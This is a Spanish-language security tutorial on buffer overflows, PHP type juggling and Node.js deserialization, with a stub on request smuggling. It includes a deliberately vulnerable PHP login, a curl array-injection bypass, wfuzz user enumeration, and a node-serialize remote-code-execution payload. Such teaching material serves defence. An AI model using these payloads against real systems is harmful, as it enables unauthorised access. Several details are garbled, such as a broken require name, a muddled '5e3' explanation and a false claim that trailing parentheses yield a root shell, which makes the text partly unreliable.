Hay `muchas estrategias` para `explotar` el buffer overflow, pero las dos `más comunes` son:

-`Stack overflow attack`: esto es cuando intentamos meter en un buffer de un programa más datos de los que tiene asignados, esto casi siempre resulta en la corrupción de los datos adyacentes al bufer. Este es el más común de este tipo de ataques.

-`Heap overflow attack`: Esto pasa cuando el buffer donde es guardada la información tiene mucha más memoria asignada de la necesaria. Para explotar esto se corrompen los datos almacenados para que la aplicación o la web sobreescriban las estructuras internas. Este tipo de ataques se dirigen a los datos del grupo de memoria abierto conocido como montón (heap).


## DETECCIÓN

El buffer overflow `suele ocurrir porque` los programadores `no detectan e impiden` que se `ponga más información de la permitida`. Para solucionarlo, los programadores deberían `prestarle más atención` sobre todo a las `líneas` del código `relacionadas con el buffer`.

Ejemplos de `codigo vulnerable`:

```
variable $username [8]
print “Enter Username:”
getstring ($username)
```

El anterior código es vulnerable, ya que `le asigna 8 bytes` a la variable `$username`, pero `no pone` nada que `limite` que se puedan escribir más bytes. Es decir, que el programa está hecho para meter nombres como Paco, o como Manolito, pero si se mete un nombre como AntonioXXXXXXX el programa crasheará. Por desgracia o afortunadamente, depende como se mire, los `lenguajes como C o C++ no están preparados` para este tipo de errores, entonces si no se programa bien la aplicación la `información sobrante al buffer se escribirá en la memoria`, así por la cara.

Para `buscar` esta vulnerabilidad en el código: es importante entender como funciona el código, luego tienes que `prestar especial atención a` donde estén programados `los inputs externos` y ver si es vulnerable o si tiene `funciones vulnerables`: `gets()`, `strcpy()`, `strcat()`, `printf()`. Estas funciones, si no se usan cuidadosamente, pueden abrir las puertas a ataques de este tipo.


#### Formas para buscar estas vulnerablidades:

·`Estática`: `buscar` entre miles de líneas de `código`, pero puede ser una tarea enorme y que pasen desapercibidas un montón de vulnerabilidades, por lo que hay `programas` que `automatizan la búsqueda` de este tipo de vulnerabilidades en el código: `Checkmarx`, `Coverity`.

·`Dinámica`: esto  consiste en `ejecutar el programa` y `probar de forma manual` o `automatizada` para ver si hay esta vulnerabilidad. Programas que lo automatizan: `Appknox`, `Veracode Dynamic Analysis`, `Netsparker`.


## MITIGAR LA VULNERABILIDAD

Lo primero es la `codificación segura`, funciones de manejo seguro del buffer, `revisión del código`, `detección` de buffer overflow `mientras se ejecuta el programa` y `detección de exploits` a través del `sistema operativo`.

También tenemos que `testear` nuestro código, pero simplemente con `análisis estáticos o dinámicos` no es suficiente, `hay que hacer ambos`, ya que sino puede dar cabida a falsos positivos o negativos. 

Pero la `forma más fácil de evitar` este problema es simplemente no usar `lenguajes vulnerables` a este tipo de ataques, por ejemplo `C` o `C++`, ya que `permiten acceso a memoria`, y, en cambio, `usar` otros más seguros como `Python`, `Java`, `C#`, `.NET`...

Claro, eso no se puede hacer siempre, porque puede suponer mucho trabajo rehacer todo el código..., entonces hay que `tener en cuenta` estos puntos:

```
· Comprobar los límites del buffer y que estén preparados para que no se pueda meter más datos de los permitidos.

· Proteger el espacio ejecutable de la aplicación, web...

· Usar sistemas operativos modernos y actualizados.

```

# TYPE JUGGLIN ATTACK
Las vulnerabilidades `Type jugglin` (también conocidas como confusión de tipos) son una clase de vulnerabilidad en la que `un objeto se inicializa o se accede a él como el tipo incorrecto`, lo que permite a un atacante `eludir potencialmente la autenticación` o socavar la seguridad del tipo de una aplicación, lo que puede conducir a la ejecución de código arbitrario `Arbitrary code execution (ACE)`.

## ¿PORQUE PASA ESTO?

El `type juggling` es un comportamiento en PHP en el que el `intérprete PHP convierte automáticamente una variable de un tipo a otro`, dependiendo del contexto en el que se utiliza. Esto puede llevar a resultados inesperados y potencialmente puede ser explotado por atacantes.

Por ejemplo:

```php
$x = "5";
if ($x == 5) {
	echo "x es igual a 5";
} else {
	echo "x no es igual a 5";
}
```

En este caso, PHP convertirá automáticamente la cadena "5" a un entero y realizará una comparación con el entero 5. Como resultado, el código mostrará `"x es igual a 5"`

Pero en este otro código:

```php
$x = "5e3";
if ($x == 500) {
	echo "x es igual a 500";
} else {
	echo "x no es igual a 500";
}
```

En este caso, `PHP intentará de nuevo convertir la cadena "5e3" a un entero`, pero `fallará` porque la cadena no es una representación válida de un entero. Sin embargo, `PHP intentará entonces convertir la cadena a un float`, y en este caso `la conversión tendrá éxito`, resultando en el valor 5000.0. Como resultado, `la comparación evaluará como falsa` y el código mostrará "x no es igual a 500".

El type juggling puede ser `explotado` por atacantes de `varias maneras`. Por ejemplo, un atacante `podría intentar pasar una cadena que se asemeja a un entero o a un valor booleano a una función que espera un tipo diferente`, intentando saltarse las comprobaciones de validación o manipular el comportamiento de la función.

Para prevenir ataques de type juggling, es importante asegurarse de que su código compruebe y maneje de manera explícita los tipos de variables esperados y utilice funciones como `is_int()`, `is_float()` y `is_bool()` para asegurarse de que las variables tengan el tipo correcto. También es buena idea utilizar operadores de comparación estrictos (por ejemplo, `===` en lugar de `==`) en la medida de lo posible, ya que estos operadores no realizan coerción de tipos.

## COMO EXPLOTAR LA VULNERABILIDAD

Hay varias formas de hacer este ataque, por lo que yo solo voy a mostrar un ejemplo. Para eso primero voy a explicar como montar un laboratorio de pruebas para esta vuln.

### LAVORATORIO DE PRUEBAS

```
> service apache2 start

> nano login.php
```

Y en ese archivo ponemos el siguiente código:

```php
<html>
	<font color="red"><h1><marquee>Secure Login Page</marquee></h1></font>
	<hr>
	<body style="background-color:powderblue;">
		<center><form method="POST" name="<?php basename($_SERVER['PHP_SELF']); ?>">
			Usuario: <input type="text" name="usuario" id="password" size="30">
			&nbsp;
			Password: <input type="password" name="password" id="password" size="30">
			<input type="submit" value="Login">
		</form></center>
	<?php
		$USER = "admin";
		$PASSWORD = "3st4p4ssw0rd!3simp0siblederomper!$2020..";
		
		if(isset($_POST['usuario']) && isset($_POST['password'])){
			if($_POST['usuario'] == $USER){
				if(strcmp($_POST['password'], $PASSWORD) == 0){
					echo "Acceso garantizado! El PIN es 4671";
				} else { echo "La password es incorrecta!"; }
			} else { echo "El usuario es incorrecto!"; }
		}
	?>
	</body>
</html>
```

### EXPLOTACIÓN

Primero podmeos probar a buscar users y passwords segun la respuesta del servidor con `wfuzz`:

```
> wfuzz -c --hh=429 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -d 'usuario=FUZZ&password=test' http://localhost/login.php
```

Entonces así nos puede sacar los users, pero no la contraseña, ya que es muy compleja como para poder sacarla mediante fuerza bruta.

Entonces vamos a aprobechar que es código `php` y con `str-recompare` entabla comparativas, pues es una vulnerablilidad critica.

```
> curl -s -X POST --data 'usuario=admin&password[]=contraseña' http://localhost/login.php
```

Si no pusiesemos los `corchetes` seria una petición normal mediante `curl` para meter un user y una contraseña, pero ya que sabemos que el user es admin, pero no sabemos la contraseña, podemos usar la vulnerabilidad que hemos visto mediante la cual si ponemos esos corchetes nos logeariamos como ese usuario sin saber la contraseña.

## PREVENCIÓN

Lo primero que tenemos que hacer para prevenir esto es `testear` que los recursos se inicialicen y se acceda a ellos con el tipo y los permisos previestos, mientras desarrollamos la aplicación web.

Tambien hay que tener en cuenta que con lenguajes de programación estaticos tenemos que `tener mas cuidado con las conversiones de tipos de variables` y es recomendable `utilizar funciones lo mas estrictas posibles para evitar conversiones inesperadas`.

# DESERIALIZATION ATTACK with Node.js

![](/assets/images/login-bypass/deserialization.png)

La deserialización es el proceso de `convertir una secuencia de bytes en un objeto` para que la aplicación web pueda usarla de la manera prevista.

Aquí vamos a ver como explotarlo cuando la aplicación web utiliza `node.js` pero esto se puede intentar hacer `en cualquier aplicación web en la que se serialice y se deserialice` información, obviamente de forma distinta a como vamos a verlo aquí.

## ¿COMO FUNCIONA?

Los ataques de deserialización ocurren cuando un atacante envía datos serializados maliciosos a una aplicación que luego deserializa y ejecuta esos datos. En el caso de Node.js, esto puede suceder si una aplicación está utilizando una biblioteca de serialización/deserialización insegura o si una aplicación está deserializando datos de una fuente no confiable.

Un atacante puede aprovechar una vulnerabilidad de deserialización para ejecutar código malicioso en la aplicación, acceder a información confidencial almacenada en la aplicación o realizar otras acciones malintencionadas. Es importante que las aplicaciones utilicen bibliotecas de serialización/deserialización seguras y verifiquen la confiabilidad de los datos que deserializan para evitar ataques de deserialización.

## COMO EXPLOTAR LA VULNERABILIDAD

Este ataque consiste en explotar un servicio web que funciona bajo un puerto de la máquina víctima.

Para este ataque nos tenemos que fijar en que al cargar la web haga referencia a un usuario.

Primero abrimos burpsuite y en `Target --> Scope` ponemos como scope lo siguiente: 

```
http://{ip_de_la_web}:{puerto}
```

Entonces podemos probar a ir a esa url e interceptar la petición:

`Copiamos la coockie` y por ejemplo con hass identifier o si nos fijamos en que tiene `%3D%3D` podremos intuir que esta en `base 64`, asi que si esta en base 64 lo decodificaremos desde consola asi (sino con otros metodos como con el decoder de burpsuite):

```
> echo "{coockie}" | base64 -d; echo

> nano data
```

Y pegamos la coockie decodificada en el archivo `data` y `cambiamos el user`.

```
> cat data | base64
```

(si hay un salto de linea  le añadimos: -w 0 ) y copiamos lo que nos haya salido copiamos.

`En burpsuite cambiamos la coockie por esta y le damos a go`, si la referencia al usuario cambia por el user que le hemos puesto podemos pensar que los datos viajan de forma serializada, y una vez el servidor recive la petición la deserializa, por lo que podria ser vulnerable.

Entonces ahora descargaremos un par de herramientas que necesitamos, `SI YA LAS TIENES INSTALADAS SALTATE ESTOS DOS COMANDOS`:

```
> curl -sL https://deb.nodesource.com/setup_10.x | sudo -E bash -

> apt install nodejs npm -y
```

Tambien otro par de herramientas que nos podemos crear son las siguientes:

Para serializar un comando (reemplazaremos el comando donde pone {comando}):

```
> nano serialize.js
```

Y dentro copiamos el siguiente código:

```js
var y = {
	rce : function( ){
	require('child_process').exec('{comando}', function(error, stdout, stderr) { console.log(stdout) });
	},
}
var serializa = require('node-serializa');
console.log("Serialized: \n" + serialize.serialize(y));
```

Para ejecutarlo:

```
> node serialize.js
```

Script de deserializacion (el whoami es el comando a ejecutar):

```js
var serialize = require('node-serialize')
var payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'whoami\', function(error, stdout, stderr) { console.log(stdout) });}()"}'
serialize.unserialize(payload)
```

Sin los últimos `()` es como debería funcionar, pero se descubrio un error a nivel de sistema que hace que si los ponemos directamente nos da una shell de root.

## PREVENCIÓN

Podemos hacer unas cuantas cosas para prevenir este tipo de ataques:

```
·Utilice una biblioteca de serialización/deserialización segura: Hay varias opciones disponibles, como JSON.stringify y JSON.parse en JavaScript nativo y bibliotecas como "safe-json-parse" y "json-parse-better-errors".

·Verifique la confiabilidad de los datos que deserializa: Asegúrese de que los datos que está deserializando provienen de una fuente confiable y no han sido alterados de alguna manera.

·Realice una revisión de seguridad regular de su código: Asegúrese de revisar regularmente su código en busca de vulnerabilidades de seguridad, incluyendo vulnerabilidades de deserialización.

·Utilice un marco de seguridad: Algunos marcos de aplicaciones web, como Express.js, proporcionan medidas de seguridad incorporadas para proteger contra ataques de deserialización.

·Utilice técnicas de entrada de validación y sanitización: Asegúrese de validar y sanitizar todos los datos de entrada para evitar que los atacantes inyecten datos maliciosos en su aplicación.
```



# HTTP REQUEST SMUGGLING ATTACK
// notas para cuando haga esto, versiones vulnerables de nginx: 1.18.0 1.19.0
https://medium.com/numen-cyber-labs/http-request-smuggling-how-to-detect-and-attack-c71f6c483e3d
https://portswigger.net/web-security/request-smuggling
